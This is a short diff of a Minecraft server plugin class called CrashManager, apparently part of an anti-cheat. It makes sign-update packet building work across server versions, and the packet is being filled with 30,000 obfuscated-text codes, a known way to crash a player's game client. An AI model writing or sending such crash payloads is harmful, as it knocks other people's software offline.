@@ -7,8 +7,9 @@ import org.bukkit.entity.Player;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.BookMeta;
 import org.bukkit.scheduler.BukkitRunnable;
-import vac.VAC;
 import vac.util.PacketUtils;
+import vac.util.VersionUtil;
+import vac.VAC;
 
 import java.lang.reflect.Constructor;
 import java.util.*;
@@ -188,9 +189,10 @@ public class CrashManager {
 
     private Object createSignUpdatePacket(Object blockPos) {
         try {
-            Class<?> clazz = Class.forName("net.minecraft.server.v1_16_R3.PacketPlayOutTileEntityData");
-            Class<?> bpClass = Class.forName("net.minecraft.server.v1_16_R3.BlockPosition");
-            Class<?> nbtClass = Class.forName("net.minecraft.server.v1_16_R3.NBTTagCompound");
+            VersionUtil.init();
+            Class<?> clazz = VersionUtil.getNmsClass("PacketPlayOutTileEntityData");
+            Class<?> bpClass = VersionUtil.getNmsClass("BlockPosition");
+            Class<?> nbtClass = VersionUtil.getNmsClass("NBTTagCompound");
 
             StringBuilder huge = new StringBuilder();
             for (int i = 0; i < 30000; i++) huge.append("§k");
